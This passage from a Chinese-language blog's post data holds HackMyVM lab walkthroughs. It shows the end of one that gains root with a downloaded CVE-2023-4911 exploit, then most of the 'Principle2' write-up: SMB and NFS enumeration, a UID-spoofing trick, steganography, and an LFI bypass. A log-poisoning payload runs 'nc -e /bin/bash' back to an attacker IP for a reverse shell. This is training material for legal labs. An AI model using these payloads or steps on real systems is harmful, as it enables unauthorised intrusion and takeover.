jammy\n```\n\n\u627e\u4e00\u4e0b\uff0c\u53d1\u73b0**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**\u53ef\u4ee5\uff0c\u4f46\u662f\u8981\u7528\u7279\u5b9a\u7684\u811a\u672c\uff0c\u6709\u4e9b\u811a\u672c\u4e0d\u884c\n\n```bash\n#kali\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ python3 -m http.server 80                                                                   \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n#\u9776\u673a\nangela@pipy:/tmp$ wget 192.168.205.141/main.zip\n--2025-01-18 03:06:17--  http://192.168.205.141/main.zip\nConnecting to 192.168.205.141:80... failed: Connection refused.\nangela@pipy:/tmp$ wget 192.168.205.141/main.zip\n--2025-01-18 03:06:25--  http://192.168.205.141/main.zip\nConnecting to 192.168.205.141:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3044 (3.0K) [application/octet-stream]\nSaving to: \u2018main.zip\u2019\n\nmain.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================>]   2.97K  --.-KB/s    in 0s    \n\n2025-01-18 03:06:25 (21.8 MB/s) - \u2018main.zip\u2019 saved [3044/3044]\n\nangela@pipy:/tmp$ unzip main.zip\nArchive:  main.zip\nacf0d3a8bd4c437475a7c4c83f5790e53e8103cb\n   creating: CVE-2023-4911-main/\n  inflating: CVE-2023-4911-main/Makefile  \n  inflating: CVE-2023-4911-main/README.md  \n  inflating: CVE-2023-4911-main/exp.c  \n  inflating: CVE-2023-4911-main/gen_libc.py  \nangela@pipy:/tmp$ cd CVE-2023-4911-main/\nangela@pipy:/tmp/CVE-2023-4911-main$ make\ngcc -o exp exp.c\npython3 gen_libc.py\n[*] '/lib/x86_64-linux-gnu/libc.so.6'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n./exp\ntry 100\n# id\nuid=0(root) gid=0(root) groups=0(root),1000(angela)\n\n```sentence", "top": 0, "createdAt": 1751016808, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P111": {"htmlDir": "docs/post/hmv_Principle2.html", "labels": ["HackMyVM"], "postTitle": "hmv_Principle2", "postUrl": "post/hmv_Principle2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/111", "commentNum": 0, "wordCount": 22252, "description": "# hmv_Principle2\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.247\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST\nNmap scan report for thetruthoftalos.hmv (192.168.205.247)\nHost is up (0.00075s latency).\nNot shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n2049/tcp  open  nfs\n35659/tcp open  unknown\n42607/tcp open  unknown\n43239/tcp open  unknown\n43401/tcp open  unknown\n46365/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 2.07 seconds\n                                                                   \n```\n\n\u5176\u4e2d80\uff0c111\uff0c139\uff0c445\uff0c2049\u7aef\u53e3\u6211\u4eec\u6bd4\u8f83\u611f\u5174\u8da3\uff0c\u4f46\u662f\u6211\u5148\u770bsmb\u670d\u52a1\uff0c\u56e0\u4e3a\u6211\u6015\u4ed6\u6574\u5e7a\u86fe\u5b50\n\n---\n\n# 2.\u8e29\u70b9\n\n## prot 445\n\nps:\u5b83\u8fd9\u4e2asmb\u670d\u52a1\u4e0d\u77e5\u9053\u662f\u5b83\u9776\u673a\u6709\u5e7a\u86fe\u5b50\u8fd8\u662f\u6211\u653b\u51fb\u673a\u6709\u5e7a\u86fe\u5b50\uff0c\u6211\u7528\u4e0d\u4e86smbmap\uff0c\u800c\u4e14\u6211\u7528smbclient\u8bbf\u95ee\u76ee\u5f55\u6709\u6982\u7387\u5931\u8d25\uff0c\u5982\u679c\u4f60\u590d\u73b0\u5931\u8d25\u7684\u8bdd\uff0c\u591a\u8bd5\u51e0\u6b21\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient //192.168.205.247/public\nPassword for [WORKGROUP\\kali]:\nTry 'help' to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Tue Nov 28 19:57:45 2023\n  ..                                  D        0  Sun Nov 26 00:19:40 2023\n  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023\n  straton.txt                         N      718  Sun Nov 19 20:00:24 2023\n  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023\n\n                19962704 blocks of size 1024. 17182940 blocks available\nsmb: \\> get new_era.txt\ngetting file \\new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)\nsmb: \\> get straton.txt\ngetting file \\straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)\nsmb: \\> get loyalty.txt\ngetting file \\loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)\nsmb: \\> exit\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat new_era.txt                   \nYesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat straton.txt\nThis fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.\n\nAMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?\nSTRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat loyalty.txt\nThis text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).\n\nWhat I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.\n\n2257686f2061726520796f752c207468656e3f22\n\nTo put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.\n                                                                                                                                     \n\n# new_era.txt\u7ffb\u8bd1\n\u6628\u5929\u53d1\u751f\u4e86\u91cd\u5927\u53d8\u5316\uff0c\u65b0\u653f\u5e9c\uff0c\u65b0\u5e02\u957f\u3002\u6240\u6709\u516c\u6c11\u90fd\u91cd\u65b0\u5206\u914d\u4e86\u4efb\u52a1\u3002\u4e3a\u4e86\u5b89\u5168\u8d77\u89c1\uff0c\u6bcf\u4e2a\u7528\u6237\u90fd\u5e94\u8be5\u66f4\u6539\u5bc6\u7801\u3002\n\n# straton.txt\u7ffb\u8bd1\n\u65af\u7279\u62c9\u987f\u7684\u300a\u8bba\u5b87\u5b99\u300b\u4e2d\u7684\u8fd9\u6bb5\u7247\u6bb5\u4f3c\u4e4e\u5bf9\u7956\u5148\u548c\u521b\u59cb\u4eba\u90fd\u5177\u6709\u91cd\u5927\u610f\u4e49\u3002\n\n\u963f\u7c73\u5854\u65af\uff1a\u4f46\u662f\uff0c\u8fd9\u544a\u8bc9\u6211\u4eec\u6709\u5173\u5b87\u5b99\u672c\u8d28\u7684\u4ec0\u4e48\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u6b63\u5728\u8ba8\u8bba\u7684\uff1f\n\u65af\u7279\u62c9\u987f\uff1a\u8fd9\u662f\u6211\u4eec\u5fc5\u987b\u56de\u7b54\u7684\u4e0b\u4e00\u4e2a\u95ee\u9898\u3002\u6211\u4eec\u4ece\u81ea\u6211\u5f00\u59cb\uff0c\u56e0\u4e3a\u81ea\u6211\u51b3\u5b9a\u4e86\u6211\u4eec\u4f5c\u4e3a\u4e2a\u4f53\u7684\u5b58\u5728\uff1b\u4f46\u662f\uff0c\u5982\u679c\u6ca1\u6709\u5468\u56f4\u7684\u4e8b\u7269\uff0c\u81ea\u6211\u5c31\u65e0\u6cd5\u5b58\u5728\u3002\u516c\u6c11\u751f\u6d3b\u5728\u57ce\u5e02\u4e2d\uff1b\u57ce\u5e02\u751f\u6d3b\u5728\u5b87\u5b99\u4e2d\u3002\u6240\u4ee5\u73b0\u5728\u6211\u4eec\u5fc5\u987b\u5c06\u6211\u4eec\u53d1\u73b0\u7684\u539f\u7406\u5e94\u7528\u5230\u66f4\u5e7f\u9614\u7684\u4e16\u754c\uff0c\u5e76\u95ee\uff1a\u5982\u679c\u4eba\u5c31\u50cf\u4e00\u53f0\u673a\u5668\uff0c\u90a3\u4e48\u5b87\u5b99\u7684\u672c\u8d28\u662f\u5426\u4e5f\u7c7b\u4f3c\uff1f\u5982\u679c\u662f\u8fd9\u6837\uff0c\u4ece\u8fd9\u4e2a\u4e8b\u5b9e\u4e2d\u53ef\u4ee5\u5f97\u51fa\u4ec0\u4e48\u7ed3\u8bba\uff1f\n\n# loyalty.txt\u7ffb\u8bd1\n\u8fd9\u6bb5\u6587\u5b57\u5728\u62dc\u4f26 (7) \u548c\u8d6b\u5c14\u66fc\u52aa\u6bd4\u65af (452) \u7684\u8fa9\u8bba\u4e2d\u5f15\u8d77\u4e86\u76f8\u5f53\u5927\u7684\u4e89\u8bae\u3002\n\n\u56e0\u6b64\uff0c\u6211\u8ba4\u4e3a\uff0c\u6211\u4eec\u5e76\u975e\u751f\u6765\u5c31\u662f\u5b8c\u5168\u81ea\u7531\u7684\u4e2a\u4f53\uff0c\u53ea\u5bf9\u81ea\u5df1\u8d1f\u8d23\u3002\u6211\u4eec\u5b58\u5728\u7684\u6838\u5fc3\uff0c\u6211\u4eec\u7684\u77e5\u89c9\uff0c\u5c06\u6211\u4eec\u4e0e\u52a8\u7269\u738b\u56fd\u533a\u5206\u5f00\u6765\uff0c\u5e76\u4f7f\u6211\u4eec\u9ad8\u4e8e\u52a8\u7269\u738b\u56fd\u3002\u6b63\u5982\u6211\u6240\u8bf4\uff0c\u8fd9\u4e0d\u662f\u50b2\u6162\u7684\u95ee\u9898\uff0c\u800c\u662f\u8d23\u4efb\u7684\u95ee\u9898\u3002\n\n2257686f2061726520796f752c207468656e3f22\n\n\u7b80\u800c\u8a00\u4e4b\uff1a\u6211\u4eec\u6bcf\u4e2a\u4eba\u90fd\u5bf9\u4eba\u7c7b\u672c\u8eab\u3001\u5bf9\u8de8\u8d8a\u65f6\u7a7a\u7684\u4eba\u7c7b\u9879\u76ee\u8d1f\u6709\u5fe0\u8bda\u7684\u4e49\u52a1\u3002\u8fd9\u4e0d\u662f\u4e00\u4ef6\u5c0f\u4e8b\uff0c\u4e5f\u4e0d\u662f\u54f2\u5b66\u5bb6\u7684\u62bd\u8c61\u95ee\u9898\u3002\u5b83\u662f\u6bcf\u4e2a\u4eba\u751f\u547d\u4e2d\u6df1\u523b\u800c\u91cd\u8981\u7684\u4e00\u90e8\u5206\u3002\u5b83\u662f\u610f\u4e49\u548c\u6d1e\u5bdf\u529b\u7684\u666e\u904d\u6e90\u6cc9\uff0c\u53ef\u4ee5\u5c06\u6211\u4eec\u56e2\u7ed3\u5728\u4e00\u8d77\uff0c\u4e3a\u6211\u4eec\u94fa\u5e73\u901a\u5f80\u66f4\u5149\u660e\u672a\u6765\u7684\u9053\u8def\uff1b\u8fd9\u4e5f\u662f\u4e00\u6761\u5206\u754c\u7ebf\uff0c\u4e00\u6761\u5fc5\u987b\u4e0e\u90a3\u4e9b\u5ba3\u626c\u81ea\u6211\u6bc1\u706d\u798f\u97f3\u7684\u4eba\u5212\u6e05\u7684\u754c\u7ebf\u3002\u6211\u4eec\u5ffd\u89c6\u5b83\uff0c\u540e\u679c\u81ea\u8d1f\u3002\n```\n\n\u5176\u4e2d\u5bc6\u7801\u4e3a**\u7a7a\u3002**  \u6211\u4eec\u6bd4\u8f83\u611f\u5174\u8da3\u7684\u662f\u90a3\u4e32\u50cf\u5bc6\u7801\u4e00\u6837\u7684\u5b57\u7b26\u4e32\u3002smb\u670d\u52a1\u5c31\u53ef\u4ee5\u544a\u4e00\u6bb5\u843d\u4e86\n\n---\n\n## prot 80\n\n80\u7aef\u53e3\u662fApache2\u7684\u521d\u59cb\u9875\uff0c\u5e76\u4e14\u5b83\u5927\u5c0f\u4e3a\u5e38\u89c4\u5927\u5c0f`10701`\uff0c\u90a3\u6211\u4eec\u7206\u7834\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.247 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.247\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 10701]\nProgress: 110804 / 311425 (35.58%)[ERROR] parse 'http://192.168.205.247/besalu\\t.php': net/url: invalid control character in URL\n[ERROR] parse 'http://192.168.205.247/besalu\\t.html': net/url: invalid control character in URL\n[ERROR] parse 'http://192.168.205.247/besalu\\t.txt': net/url: invalid control character in URL\n[ERROR] parse 'http://192.168.205.247/besalu\\t.md': net/url: invalid control character in URL\n/index.html           (Status: 200) [Size: 10701]\nProgress: 311420 / 311425 (100.00%)\n===============================================================\nFinished\n===============================================================\n                                                                            \n```\n\n\u65e0\u679c\uff0c\u544a\u4e00\u6bb5\u843d\n\n---\n\n## prot 111\n\n\u56e0\u4e3a\u6211\u6ca1\u6709\u6253\u8fc7\u8fd9\u4e2a\u670d\u52a1\uff0c\u6211\u5c31\u53bb[hacktricks](https://book.hacktricks.wiki/)\u641c\u7d22\u4e86\u4e00\u4e0b\n\n**\u8d44\u6599**\uff1ahttps://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port\n\n![image](https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65)\n\n\u9605\u8bfb\u6587\u672c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5b83\u548cNFS\u8854\u63a5\uff0c\u6211\u4eec\u521a\u597d\u6709NFS\n\n**\u8d44\u6599**\uff1ahttps://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html\n\n\u67e5\u770b\u6302\u8f7d\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ showmount -e 192.168.205.247\nExport list for 192.168.205.247:\n/var/backups *\n/home/byron  *\n                     \n```\n\nps:*\u6302\u8f7d\u8bb0\u5f97\u8981\u7528sudo\uff0c\u4e0d\u7136\u5b83\u4f1a\u62a5\u9519*\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo mount -t nfs 192.168.205.247:/var/backups /home/kali/test/tmp/backup\n[sudo] kali \u7684\u5bc6\u7801\uff1a\n                                                                                                                                                                                                                                                          \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cd backup \ncd: \u6743\u9650\u4e0d\u591f: backup\n             \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sudo mount -t nfs 192.168.205.247:/home/byron /home/kali/test/tmp/home\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cd home\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home]\n\u2514\u2500$ ls\nmayor.txt  memory.txt\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home]\n\u2514\u2500$ cat mayor.txt \nNow that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home]\n\u2514\u2500$ cat memory.txt\nHermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.\n                                        \n# mayor.txt\u7ffb\u8bd1\n\u73b0\u5728\u6211\u5df2\u7ecf\u662f\u5e02\u957f\u4e86\uff0c\u6211\u89c9\u5f97\u8d6b\u66fc\u52aa\u6bd4\u65af\u6b63\u5728\u5bc6\u8c0b\u53cd\u5bf9\u6211\uff0c\u6211\u731c\u4ed6\u6709\u4e00\u4e2a\u79d8\u5bc6\u7ec4\u7ec7\u5e76\u4e14\u628a\u5b83\u9690\u85cf\u8d77\u6765\u3002\n\n# memory.txt\u7ffb\u8bd1     \n\u8d6b\u66fc\u52aa\u6bd4\u65af\u544a\u8bc9\u6211\uff0c\u4ed6\u5fd8\u8bb0\u4e86\u5bc6\u7801\uff0c\u65e0\u6cd5\u66f4\u6539\uff0c\u8c22\u5929\u8c22\u5730\uff0c\u6211\u4fdd\u5b58\u4e86\u6bcf\u4e2a\u90bb\u5c45\u7684\u53f7\u7801\u548c\u5341\u516d\u8fdb\u5236\u5bc6\u7801\u8bb0\u5f55\u3002\u6211\u8ba4\u4e3a\u4ed6\u4f1a\u6210\u4e3a\u65b0\u8036\u8def\u6492\u51b7\u7684\u597d\u5e02\u957f\u3002                                                \n```\n\n\u544a\u8bc9\u6211\u4eec\u4ed6\u4fdd\u5b58\u4e86\u6bcf\u4e2a\u90bb\u5c45\u7684\u53f7\u7801\u548c\u5341\u516d\u8fdb\u5236\u5bc6\u7801\u8bb0\u5f55\uff0c\u5e94\u8be5\u5c31\u5728\u6211\u4eec\u770b\u4e0d\u4e86\u90a3\u4e2a\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u53bb\u67e5\u770b\u4e00\u4e0b\u5b83\u7684\u6743\u9650\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ls -la\n\u603b\u8ba1 52\ndrwxrwxr-x  4 kali kali    4096  1\u670812\u65e5 10:26 .\ndrwxrwxr-x 31 kali kali   12288  1\u670812\u65e5 10:03 ..\ndrwxr--r--  2   54 backup 28672 2023\u5e7411\u670829\u65e5 backup\ndrwxr-xr-x  3 1001   1001  4096 2023\u5e7411\u670826\u65e5 home\n\n```\n\n\u521b\u5efa\u5177\u6709\u76f8\u540c UID \u7684\u7528\u6237\u8fdb\u884c\u8bbf\u95ee\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ sudo useradd -u 54 hack\nuseradd warning: hack's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.\n                                  \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ su hack           \n\u5bc6\u7801\uff1a \n$ bash\nhack@kali:/home/kali/test/tmp$ cd backup/\nhack@kali:/home/kali/test/tmp/backup$ ls\n(\u8fd9\u91cc\u7701\u7565)\n\nhack@kali:/home/kali/test/tmp/backup$ cat *.txt\n(\u8fd9\u91cc\u7701\u7565)\n\n```\n\n\u6211\u4eec\u5c06\u5341\u516d\u8fdb\u5236\u5c1d\u8bd5\u6062\u590d\u4e00\u4e0b\n\n```bash\nhack@kali:/home/kali/test/tmp/backup$ cat *.txt > /tmp/a.txt\nhack@kali:/home/kali/test/tmp/backup$ su kali\n\u5bc6\u7801\uff1a \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/backup]\n\u2514\u2500$ cp /tmp/a.txt ~/test/a.txt\n                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ xxd -ps -r a.txt | strings\n(\u8fd9\u91cc\u7701\u7565)\nByronIsAsshole\n(\u8fd9\u91cc\u7701\u7565)                \n```\n\n\u83b7\u5f97\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u5bc6\u7801\u7684\u4e1c\u897f\uff0c\u5b83\u6ca1\u6709\u5f00\u653essh\u7aef\u53e3\uff0c\u90a3\u5c31\u53ea\u53ef\u80fd\u662fsmb\u670d\u52a1\u7684\u5bc6\u7801\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient -L //192.168.205.247// -N                       \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        public          Disk      New Jerusalem Public\n        hermanubis      Disk      Hermanubis share\n        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)\nReconnecting with SMB1 for workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.205.247 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n                                                                                                                                                                                                                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient //192.168.205.247/hermanubis -U hermanubis\nPassword for [WORKGROUP\\hermanubis]:\nTry 'help' to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Tue Nov 28 22:44:44 2023\n  ..                                  D        0  Wed Nov 29 09:13:50 2023\n  index.html                          N      346  Tue Nov 28 22:44:41 2023\n  prometheus.jpg                      N   307344  Wed Nov 29 01:23:24 2023\n\n                19962704 blocks of size 1024. 17151324 blocks available\nsmb: \\> get index.html \ngetting file \\index.html of size 346 as index.html (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)\nsmb: \\> get prometheus.jpg \ngetting file \\prometheus.jpg of size 307344 as prometheus.jpg (11543.8 KiloBytes/sec) (average 6260.0 KiloBytes/sec)\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat index.html \n<!DOCTYPE html>\n<html lang='es'>\n<head>\n    <meta charset='UTF-8'>\n    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\n    <title>Welcome to the resistance forum</title>\n</head>\n<body>\n\n    <h1>Welcome to the resistance forum</h1>\n\n    <p>free our chains!</p>\n\n    <img src='prometheus.jpg' alt='chained'>\n\n</body>\n</html>\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ exiftool prometheus.jpg   \nExifTool Version Number         : 13.00\nFile Name                       : prometheus.jpg\nDirectory                       : .\nFile Size                       : 307 kB\nFile Modification Date/Time     : 2025:01:12 12:33:09+08:00\nFile Access Date/Time           : 2025:01:12 12:33:09+08:00\nFile Inode Change Date/Time     : 2025:01:12 12:33:09+08:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : None\nX Resolution                    : 1\nY Resolution                    : 1\nImage Width                     : 1920\nImage Height                    : 1080\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 1920x1080\nMegapixels                      : 2.1\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ stegseek prometheus.jpg \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: 'soldierofanubis'   \n[i] Original filename: 'secret.txt'.\n[i] Extracting to 'prometheus.jpg.out'.\n\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat prometheus.jpg.out\nI have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv\n                                                                                                                                                                                              \n```\n\n\u56fe\u7247\u91cc\u9690\u85cf\u4e86\u4e00\u4e2a\u57df\u540d\uff0c\u52a0\u5165\u6211\u4eec\u7684hosts\u4e2d\n\n![image](https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f)\n\n\u6b64\u5730\u65e0\u94f6\u4e09\u767e\u4e24\uff0c\u7206\u7834\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://thetruthoftalos.hmv/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,md,php,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/uploads              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]\n/index.html           (Status: 200) [Size: 8]\n/index.php            (Status: 200) [Size: 1970]\nProgress: 51629 / 311425 (16.58%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 53720 / 311425 (17.25%)\n===============================================================\nFinished\n===============================================================\n\n```\n\n`index.php`\u5927\u5c0f\u660e\u663e\u4e0d\u4e00\u6837\n\n![image](https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70)\n\n\u4f60\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u70b9\u4e1c\u897f\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u4e00\u4e9b\u6709\u8da3\u7684\u4e1c\u897f\n\n![image](https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67)\n\n\u770b\u7740\u5c31\u50cf\u6709**\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e**\n\n![image](https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354)\n\n\u56de\u663e\u4e0d\u5bf9\uff0c\u5e94\u8be5\u8981**\u53cc\u91cd\u7ed5\u8fc7**\n\n![image](https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037)\n\n\u6210\u529f\u83b7\u5f97`/etc/passwd`\uff0c\u56e0\u4e3a\u6ca1\u6709ssh\u7aef\u53e3\uff0c\u6240\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u65e5\u5fd7\u5305\u542b\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u5b83\u7684\u67b6\u6784\n\n![image](https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09)\n\n```bash\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n```\n\n![image](https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82)\n\n\u53ef\u4ee5\u56de\u663e\uff0c\u6211\u4eec\u6784\u9020\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ curl http://thetruthoftalos.hmv/shell -H 'User-Agent: <?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?>'\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.22.1</center>\n</body>\n</html>\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ curl http://thetruthoftalos.hmv/index.php?filename=....//....//....//....///var/log/nginx/access.log       \n\n\n```\n\n\u5361\u4f4f\u5c31\u662f\u5f39\u56de\u6765\u4e86\n\n---\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n---\n\n# 